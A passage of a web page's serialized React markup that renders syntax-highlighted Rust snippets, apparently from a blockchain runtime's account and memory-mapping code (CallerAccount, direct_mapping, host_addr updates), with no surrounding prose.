token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n879:[\"$\",\"span\",\"code-segment-295\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"mut\"]}]\n87a:[\"$\",\"span\",\"code-segment-296\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n87b:[\"$\",\"span\",\"code-segment-297\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"BorrowedAccount\"]}]\n87c:[\"$\",\"span\",\"code-segment-298\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n87d:[\"$\",\"span\",\"code-segment-299\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'_\"]}]\n87e:[\"$\",\"span\",\"code-segment-300\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n87f:[\"$\",\"span\",\"code-segment-301\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n880:[\"$\",\"span\",\"code-segment-302\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n881:[\"$\",\"span\",\"line-number--32\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[32]}]\n882:[\"$\",\"span\",\"code-segment-304\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    direct_mapping\"]}]\n883:[\"$\",\"span\",\"code-segment-305\",{\"clas"])</script><script>self.__next_f.push([1,"sName\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n884:[\"$\",\"span\",\"code-segment-306\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n885:[\"$\",\"span\",\"code-segment-307\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n886:[\"$\",\"span\",\"code-segment-308\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n887:[\"$\",\"span\",\"code-segment-309\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n888:[\"$\",\"span\",\"line-number--33\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[33]}]\n889:[\"$\",\"span\",\"code-segment-311\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n88a:[\"$\",\"span\",\"code-segment-312\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n88b:[\"$\",\"span\",\"code-segment-313\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n88c:[\"$\",\"span\",\"code-segment-314\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n88d:[\"$\",\"span\",\"code-segment-315\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n88e:[\"$\",\"span\",\"code-segment-316\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}]\n88f:[\"$\",\"span\",\"code-segment-317\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n890:[\"$\",\"span\",\"code-segment-318\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n891:[\"$\",\"span\",\"code-segment-319\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n892:[\"$\",\"span\",\"code-segment-320\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n893:[\"$\",\"span\",\"code-segment-321\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n894:[\"$\",\"span\",\"code-segment-322\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}]\n895:[\"$\",\"span\",\"code-segment-323\",{\"c"])</script><script>self.__next_f.push([1,"lassName\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n896:[\"$\",\"span\",\"code-segment-324\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n897:[\"$\",\"span\",\"code-segment-325\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n898:[\"$\",\"span\",\"code-segment-326\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n899:[\"$\",\"span\",\"line-number--34\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[34]}]\n89a:[\"$\",\"span\",\"code-segment-328\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n89b:[\"$\",\"span\",\"code-segment-329\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n89c:[\"$\",\"span\",\"code-segment-330\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n89d:[\"$\",\"span\",\"line-number--35\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[35]}]\n89e:[\"$\",\"span\",\"line-number--36\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[36]}]\n89f:[\"$\",\"span\",\"code-segment-334\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n8a0:[\"$\",\"span\",\"code-segment-335\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n8a1:[\"$\",\"span\",\"code-segment-336\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" direct_mapping \"]}]\n8a2:[\"$\",\"span\",\"code-segment-337\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\u0026\"]}]\n8a3:[\"$\",\"span\",\"code-segment-33"])</script><script>self.__next_f.push([1,"8\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}]\n8a4:[\"$\",\"span\",\"code-segment-339\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8a5:[\"$\",\"span\",\"code-segment-340\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"original_data_len \"]}]\n8a6:[\"$\",\"span\",\"code-segment-341\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n8a7:[\"$\",\"span\",\"code-segment-342\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8a8:[\"$\",\"span\",\"code-segment-343\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"0\"]}]\n8a9:[\"$\",\"span\",\"code-segment-344\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8aa:[\"$\",\"span\",\"code-segment-345\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n8ab:[\"$\",\"span\",\"code-segment-346\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8ac:[\"$\",\"span\",\"line-number--37\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[37]}]\n8ad:[\"$\",\"span\",\"code-segment-348\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n8ae:[\"$\",\"span\",\"code-segment-349\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n8af:[\"$\",\"span\",\"code-segment-350\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8b0:[\"$\",\"span\",\"line-number--38\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[38]}]\n8b1:[\"$\",\"span\",\"code-segment-352\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n8b2:[\"$\",\"span\",\"code-segment-353\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n8b3:[\"$\",\"span\",\"code-segmen"])</script><script>self.__next_f.push([1,"t-354\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region \"]}]\n8b4:[\"$\",\"span\",\"code-segment-355\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n8b5:[\"$\",\"span\",\"code-segment-356\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" memory_mapping\"]}]\n8b6:[\"$\",\"span\",\"code-segment-357\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8b7:[\"$\",\"span\",\"code-segment-358\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"region\"]}]\n8b8:[\"$\",\"span\",\"code-segment-359\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n8b9:[\"$\",\"span\",\"code-segment-360\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccessType\"]}]\n8ba:[\"$\",\"span\",\"code-segment-361\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"::\"]}]\n8bb:[\"$\",\"span\",\"code-segment-362\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Load\"]}]\n8bc:[\"$\",\"span\",\"code-segment-363\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n8bd:[\"$\",\"span\",\"code-segment-364\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" caller_account\"]}]\n8be:[\"$\",\"span\",\"code-segment-365\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8bf:[\"$\",\"span\",\"code-segment-366\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"vm_data_addr\"]}]\n8c0:[\"$\",\"span\",\"code-segment-367\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n8c1:[\"$\",\"span\",\"code-segment-368\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"?\"]}]\n8c2:[\"$\",\"span\",\"code-segment-369\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n8c3:[\"$\",\"span\",\"code-segment-370\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8c4:[\"$\",\"span\",\"line-number--39\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,"])</script><script>self.__next_f.push([1,"0.1)\",\"marginRight\":\"1em\"},\"children\":[39]}]\n8c5:[\"$\",\"span\",\"code-segment-372\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n8c6:[\"$\",\"span\",\"code-segment-373\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"let\"]}]\n8c7:[\"$\",\"span\",\"code-segment-374\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_ptr \"]}]\n8c8:[\"$\",\"span\",\"code-segment-375\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"=\"]}]\n8c9:[\"$\",\"span\",\"code-segment-376\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_account\"]}]\n8ca:[\"$\",\"span\",\"code-segment-377\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8cb:[\"$\",\"span\",\"code-segment-378\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get_data\"]}]\n8cc:[\"$\",\"span\",\"code-segment-379\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n8cd:[\"$\",\"span\",\"code-segment-380\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n8ce:[\"$\",\"span\",\"code-segment-381\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8cf:[\"$\",\"span\",\"code-segment-382\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"as_ptr\"]}]\n8d0:[\"$\",\"span\",\"code-segment-383\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n8d1:[\"$\",\"span\",\"code-segment-384\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n8d2:[\"$\",\"span\",\"code-segment-385\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8d3:[\"$\",\"span\",\"code-segment-386\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"as\"]}]\n8d4:[\"$\",\"span\",\"code-segment-387\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8d5:[\"$\",\"span\",\"code-segment-388\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n8d6:[\"$\",\"span\",\"code-segment-389\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n8d7:[\"$\",\"span\",\"code-segment-390\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8d8:[\"$\",\"s"])</script><script>self.__next_f.push([1,"pan\",\"line-number--40\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[40]}]\n8d9:[\"$\",\"span\",\"code-segment-392\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n8da:[\"$\",\"span\",\"code-segment-393\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"if\"]}]\n8db:[\"$\",\"span\",\"code-segment-394\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" region\"]}]\n8dc:[\"$\",\"span\",\"code-segment-395\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8dd:[\"$\",\"span\",\"code-segment-396\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n8de:[\"$\",\"span\",\"code-segment-397\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8df:[\"$\",\"span\",\"code-segment-398\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"get\"]}]\n8e0:[\"$\",\"span\",\"code-segment-399\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n8e1:[\"$\",\"span\",\"code-segment-400\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n8e2:[\"$\",\"span\",\"code-segment-401\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8e3:[\"$\",\"span\",\"code-segment-402\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"!=\"]}]\n8e4:[\"$\",\"span\",\"code-segment-403\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" callee_ptr \"]}]\n8e5:[\"$\",\"span\",\"code-segment-404\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n8e6:[\"$\",\"span\",\"code-segment-405\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8e7:[\"$\",\"span\",\"line-number--41\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children"])</script><script>self.__next_f.push([1,"\":[41]}]\n8e8:[\"$\",\"span\",\"code-segment-407\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"            region\"]}]\n8e9:[\"$\",\"span\",\"code-segment-408\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8ea:[\"$\",\"span\",\"code-segment-409\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"host_addr\"]}]\n8eb:[\"$\",\"span\",\"code-segment-410\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\".\"]}]\n8ec:[\"$\",\"span\",\"code-segment-411\",{\"className\":\"token token\",\"style\":{\"color\":\"#f08d49\"},\"children\":[\"set\"]}]\n8ed:[\"$\",\"span\",\"code-segment-412\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"(\"]}]\n8ee:[\"$\",\"span\",\"code-segment-413\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"callee_ptr\"]}]\n8ef:[\"$\",\"span\",\"code-segment-414\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\")\"]}]\n8f0:[\"$\",\"span\",\"code-segment-415\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\";\"]}]\n8f1:[\"$\",\"span\",\"code-segment-416\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8f2:[\"$\",\"span\",\"line-number--42\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[42]}]\n8f3:[\"$\",\"span\",\"code-segment-418\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"        \"]}]\n8f4:[\"$\",\"span\",\"code-segment-419\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n8f5:[\"$\",\"span\",\"code-segment-420\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8f6:[\"$\",\"span\",\"line-number--43\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[43]}]\n8f7:[\"$\",\"span\",\"code-segment-422\",{\"className\":\"$undefined\",\"style\":{},\"ch"])</script><script>self.__next_f.push([1,"ildren\":[\"    \"]}]\n8f8:[\"$\",\"span\",\"code-segment-423\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"}\"]}]\n8f9:[\"$\",\"span\",\"code-segment-23\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    is_loader_deprecated\"]}]\n8fa:[\"$\",\"span\",\"code-segment-24\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n8fb:[\"$\",\"span\",\"code-segment-25\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n8fc:[\"$\",\"span\",\"code-segment-26\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"bool\"]}]\n8fd:[\"$\",\"span\",\"code-segment-27\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n8fe:[\"$\",\"span\",\"code-segment-28\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n8ff:[\"$\",\"span\",\"line-number--5\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[5]}]\n900:[\"$\",\"span\",\"code-segment-30\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    _vm_addr\"]}]\n901:[\"$\",\"span\",\"code-segment-31\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n902:[\"$\",\"span\",\"code-segment-32\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n903:[\"$\",\"span\",\"code-segment-33\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"u64\"]}]\n904:[\"$\",\"span\",\"code-segment-34\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n905:[\"$\",\"span\",\"code-segment-35\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n906:[\"$\",\"span\",\"line-number--6\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[6]}]\n907:[\"$\",\"span\",\"code-segment-37\",{\"className\":\"$undefined\",\"style\":{},\"children\":"])</script><script>self.__next_f.push([1,"[\"    account_info\"]}]\n908:[\"$\",\"span\",\"code-segment-38\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n909:[\"$\",\"span\",\"code-segment-39\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n90a:[\"$\",\"span\",\"code-segment-40\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u0026\"]}]\n90b:[\"$\",\"span\",\"code-segment-41\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"AccountInfo\"]}]\n90c:[\"$\",\"span\",\"code-segment-42\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n90d:[\"$\",\"span\",\"code-segment-43\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n90e:[\"$\",\"span\",\"line-number--7\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[7]}]\n90f:[\"$\",\"span\",\"code-segment-45\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"    original_data_len\"]}]\n910:[\"$\",\"span\",\"code-segment-46\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\":\"]}]\n911:[\"$\",\"span\",\"code-segment-47\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n912:[\"$\",\"span\",\"code-segment-48\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc99cd\"},\"children\":[\"usize\"]}]\n913:[\"$\",\"span\",\"code-segment-49\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n914:[\"$\",\"span\",\"code-segment-50\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n915:[\"$\",\"span\",\"line-number--8\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[8]}]\n916:[\"$\",\"span\",\"code-segment-52\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\"]}]\n917:[\"$\",\"span\",\"code-segment-53\",{\"className\":\"token token\",\"style\":{\"color\":\"#cc"])</script><script>self.__next_f.push([1,"c\"},\"children\":[\")\"]}]\n918:[\"$\",\"span\",\"code-segment-54\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n919:[\"$\",\"span\",\"code-segment-55\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"-\u003e\"]}]\n91a:[\"$\",\"span\",\"code-segment-56\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n91b:[\"$\",\"span\",\"code-segment-57\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Result\"]}]\n91c:[\"$\",\"span\",\"code-segment-58\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n91d:[\"$\",\"span\",\"code-segment-59\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"CallerAccount\"]}]\n91e:[\"$\",\"span\",\"code-segment-60\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003c\"]}]\n91f:[\"$\",\"span\",\"code-segment-61\",{\"className\":\"token token lifetime-annotation\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"'a\"]}]\n920:[\"$\",\"span\",\"code-segment-62\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n921:[\"$\",\"span\",\"code-segment-63\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\",\"]}]\n922:[\"$\",\"span\",\"code-segment-64\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n923:[\"$\",\"span\",\"code-segment-65\",{\"className\":\"token token\",\"style\":{\"color\":\"#f8c555\"},\"children\":[\"Error\"]}]\n924:[\"$\",\"span\",\"code-segment-66\",{\"className\":\"token token\",\"style\":{\"color\":\"#67cdcc\"},\"children\":[\"\u003e\"]}]\n925:[\"$\",\"span\",\"code-segment-67\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\" \"]}]\n926:[\"$\",\"span\",\"code-segment-68\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"{\"]}]\n927:[\"$\",\"span\",\"code-segment-69\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n928:[\"$\",\"span\",\"line-number--9\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid rgba(255,255,255,0.1)\",\"marginRight\":\"1em\"},\"children\":[9]}]\n929:[\"$\",\"span\",\"code-segment-71\",{\"clas"])</script><script>self.__next_f.push([1,"sName\":\"$undefined\",\"style\":{},\"children\":[\"    \"]}]\n92a:[\"$\",\"span\",\"code-segment-72\",{\"className\":\"token token\",\"style\":{\"color\":\"#ccc\"},\"children\":[\"...\"]}]\n92b:[\"$\",\"span\",\"code-segment-73\",{\"className\":\"$undefined\",\"style\":{},\"children\":[\"\\n\"]}]\n92c:[\"$\",\"span\",\"line-number--10\",{\"className\":\"linenumber react-syntax-highlighter-line-number\",\"style\":{\"display\":\"inline-block\",\"minWidth\":\"2.25em\",\"paddingRight\":\"1em\",\"textAlign\":\"right\",\"userSelect\":\"none\",\"color\":\"#999\",\"borderRight\":\"1px solid 